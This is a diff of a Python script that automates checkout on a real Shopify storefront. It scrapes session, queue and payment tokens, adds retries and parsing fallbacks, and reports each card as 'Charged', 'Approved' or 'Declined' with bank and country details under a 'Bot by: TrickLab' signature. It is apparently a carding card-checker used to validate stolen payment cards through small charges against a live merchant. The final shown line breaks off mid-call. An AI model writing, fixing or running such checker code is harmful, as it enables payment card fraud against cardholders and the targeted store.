@@ -153,63 +153,94 @@ async def sh(message):
             'updates[]': '1',
             'checkout': 'Check out',
         }
-        try:
-            async with r.post('https://www.buildingnewfoundations.com/cart', headers=headers, data=data, allow_redirects=True) as response:
-                text = await response.text()
-                # Save full HTML to file
-                with open('checkout_response.html', 'w') as f:
-                    f.write(text)
-                logger.info("Full checkout HTML saved to checkout_response.html")
-                logger.info(f"Checkout response HTML (first 1000 chars): {text[:1000]}")
-                logger.info(f"Final URL after redirects: {response.url}")
-                if response.status != 200:
-                    logger.error(f"Checkout request failed: Status {response.status}")
-                    return "Failed to initiate checkout: Invalid response"
+        for attempt in range(3):  # Retry up to 3 times
+            try:
+                async with r.post('https://www.buildingnewfoundations.com/cart', headers=headers, data=data, allow_redirects=True) as response:
+                    text = await response.text()
+                    # Save full HTML to file
+                    with open('checkout_response.html', 'w') as f:
+                        f.write(text)
+                    logger.info("Full checkout HTML saved to checkout_response.html")
+                    logger.info(f"Checkout response HTML (first 1000 chars): {text[:1000]}")
+                    logger.info(f"Final URL after redirects: {response.url}")
+                    if response.status != 200:
+                        logger.error(f"Checkout request failed: Status {response.status}")
+                        return "Failed to initiate checkout: Invalid response"
 
-                # Try original find_between method
-                x = find_between(text, 'serialized-session-token" content=""', '""')
-                queue_token = find_between(text, '"queueToken":"', '"')
-                stableid = find_between(text, 'stableId":"', '"')
-                paymentmethodidentifier = find_between(text, 'paymentMethodIdentifier":"', '"')
+                    # Try original find_between method
+                    x = find_between(text, 'serialized-session-token" content=""', '""')
+                    queue_token = find_between(text, '"queueToken":"', '"')
+                    stableid = find_between(text, 'stableId":"', '"')
+                    paymentmethodidentifier = find_between(text, 'paymentMethodIdentifier":"', '"')
 
-                # Fallback with BeautifulSoup
-                if not all([x, queue_token, stableid, paymentmethodidentifier]):
-                    logger.warning("find_between failed, attempting BeautifulSoup parsing")
+                    # Fallback with BeautifulSoup
                     soup = BeautifulSoup(text, 'html.parser')
-                    # Parse session_token (already working)
-                    x = soup.find('meta', {'name': 'serialized-session-token'})['content'] if soup.find('meta', {'name': 'serialized-session-token'}) else x
-                    # Try alternative selectors for others
-                    # Look for inputs, data attributes, or script tags
-                    queue_token = soup.find('input', {'name': 'queue_token'})['value'] if soup.find('input', {'name': 'queue_token'}) else queue_token
-                    stableid = soup.find('input', {'name': 'stable_id'})['value'] if soup.find('input', {'name': 'stable_id'}) else stableid
-                    paymentmethodidentifier = soup.find('input', {'name': 'payment_method_identifier'})['value'] if soup.find('input', {'name': 'payment_method_identifier'}) else paymentmethodidentifier
+                    if not all([x, queue_token, stableid, paymentmethodidentifier]):
+                        logger.warning(f"Attempt {attempt + 1}: find_between failed, attempting BeautifulSoup parsing")
+                        # Parse session_token
+                        x = soup.find('meta', {'name': 'serialized-session-token'})['content'] if soup.find('meta', {'name': 'serialized-session-token'}) else x
+                        # Try multiple input name variations
+                        input_names = [
+                            'queue_token', 'queueToken', 'QueueToken',
+                            'stable_id', 'stableId', 'StableId',
+                            'payment_method_identifier', 'paymentMethodIdentifier', 'PaymentMethodIdentifier'
+                        ]
+                        for name in input_names:
+                            input_elem = soup.find('input', {'name': name})
+                            if input_elem and input_elem.get('value'):
+                                if 'queue' in name.lower():
+                                    queue_token = input_elem['value']
+                                elif 'stable' in name.lower():
+                                    stableid = input_elem['value']
+                                elif 'payment' in name.lower():
+                                    paymentmethodidentifier = input_elem['value']
+                                logger.info(f"Found input: {name}={input_elem['value']}")
 
-                    # Try parsing script tags for JSON data
-                    if not all([queue_token, stableid, paymentmethodidentifier]):
-                        logger.info("Input parsing failed, searching script tags")
-                        scripts = soup.find_all('script')
-                        for script in scripts:
-                            if script.string and 'queueToken' in script.string:
-                                try:
-                                    # Look for JSON-like data
-                                    json_match = re.search(r'var checkout = ({.*?});', script.string, re.DOTALL)
-                                    if json_match:
-                                        checkout_data = json.loads(json_match.group(1))
-                                        queue_token = checkout_data.get('queueToken', queue_token)
-                                        stableid = checkout_data.get('stableId', stableid)
-                                        paymentmethodidentifier = checkout_data.get('paymentMethodIdentifier', paymentmethodidentifier)
-                                        logger.info(f"Found in script: queue_token={queue_token}, stableid={stableid}, paymentmethodidentifier={paymentmethodidentifier}")
-                                        break
-                                except Exception as e:
-                                    logger.error(f"Error parsing script tag: {str(e)}")
+                        # Log all inputs for debugging
+                        inputs = soup.find_all('input')
+                        logger.info(f"Found {len(inputs)} input elements: {[input.get('name') for input in inputs if input.get('name')]}")
 
-                logger.info(f"Checkout values: session_token={x}, queue_token={queue_token}, stableid={stableid}, paymentmethodidentifier={paymentmethodidentifier}")
-                if not all([x, queue_token, stableid, paymentmethodidentifier]):
-                    logger.error("One or more checkout values are missing")
+                        # Try parsing script tags for JSON data
+                        if not all([queue_token, stableid, paymentmethodidentifier]):
+                            logger.info("Input parsing failed, searching script tags")
+                            scripts = soup.find_all('script')
+                            for script in scripts:
+                                if script.string and any(key in script.string for key in ['queueToken', 'stableId', 'paymentMethodIdentifier']):
+                                    try:
+                                        # Look for JSON-like data
+                                        json_match = re.search(r'var checkout = ({.*?});', script.string, re.DOTALL)
+                                        if json_match:
+                                            checkout_data = json.loads(json_match.group(1))
+                                            queue_token = checkout_data.get('queueToken', checkout_data.get('queue_token', queue_token))
+                                            stableid = checkout_data.get('stableId', checkout_data.get('stable_id', stableid))
+                                            paymentmethodidentifier = checkout_data.get('paymentMethodIdentifier', checkout_data.get('payment_method_identifier', paymentmethodidentifier))
+                                            # Save JSON data to file
+                                            with open('checkout_json.json', 'w') as f:
+                                                json.dump(checkout_data, f, indent=2)
+                                            logger.info(f"Found in script: queue_token={queue_token}, stableid={stableid}, paymentmethodidentifier={paymentmethodidentifier}")
+                                            logger.info("Checkout JSON saved to checkout_json.json")
+                                            break
+                                    except Exception as e:
+                                        logger.error(f"Error parsing script tag: {str(e)}")
+
+                    logger.info(f"Attempt {attempt + 1}: Checkout values: session_token={x}, queue_token={queue_token}, stableid={stableid}, paymentmethodidentifier={paymentmethodidentifier}")
+                    if all([x, queue_token, stableid, paymentmethodidentifier]):
+                        break
+                    logger.warning(f"Attempt {attempt + 1}: Missing values, retrying...")
+                    await asyncio.sleep(1)  # Wait before retrying
+                else:
+                    logger.error("All retry attempts failed")
                     return "Failed to initiate checkout: Missing values"
-        except Exception as e:
-            logger.error(f"Error initiating checkout: {str(e)}")
-            return "Failed to initiate checkout"
+            except Exception as e:
+                logger.error(f"Attempt {attempt + 1}: Error initiating checkout: {str(e)}")
+                if attempt == 2:
+                    return "Failed to initiate checkout: " + str(e)
+                await asyncio.sleep(1)
+
+        logger.info(f"Final Checkout values: session_token={x}, queue_token={queue_token}, stableid={stableid}, paymentmethodidentifier={paymentmethodidentifier}")
+        if not all([x, queue_token, stableid, paymentmethodidentifier]):
+            logger.error("One or more checkout values are missing")
+            return "Failed to initiate checkout: Missing values"
 
         # Step 4: Create payment session
         headers = {
@@ -312,45 +343,4 @@ async def sh(message):
         }
         elapsed_time = time.time() - start_time
         try:
-            async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql', params=params, headers=headers, json=json_data) as response:
-                text = await response.text()
-                logger.info(f"PollForReceipt response: {text}")
-                if "thank" in text.lower():
-                    return f"""Card: {full_card}
-Status: Charged🔥
-Response: Order # confirmed
-Details: {type} - {level} - {brand}
-Bank: {bank}
-Country: {country}{flag} - {currency}
-Gateway: Shopify 1$
-Taken: {elapsed_time:.2f}s
-Bot by: TrickLab"""
-                elif "actionrequiredreceipt" in text.lower():
-                    return f"""Card: {full_card}
-Status: Approved!✅
-Response: ActionRequired
-Details: {type} - {level} - {brand}
-Bank: {bank}
-Country: {country}{flag} - {currency}
-Gateway: Shopify 1$
-Taken: {elapsed_time:.2f}s
-Bot by: TrickLab"""
-                else:
-                    fff = find_between(text, '"code":"', '"')
-                    return f"""Card: {full_card}
-Status: Declined!❌
-Response: {fff}
-Details: {type} - {level} - {brand}
-Bank: {bank}
-Country: {country}{flag} - {currency}
-Gateway: Shopify 1$
-Taken: {elapsed_time:.2f}s
-Bot by: TrickLab"""
-        except Exception as e:
-            logger.error(f"Error polling for receipt: {str(e)}")
-            return "Failed to poll for receipt"
-
-# Run the script
-if __name__ == "__main__":
-    ok = input("Card: ")
-    print(asyncio.run(sh(ok)))
+            async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql', params=params, headers=headers, jso
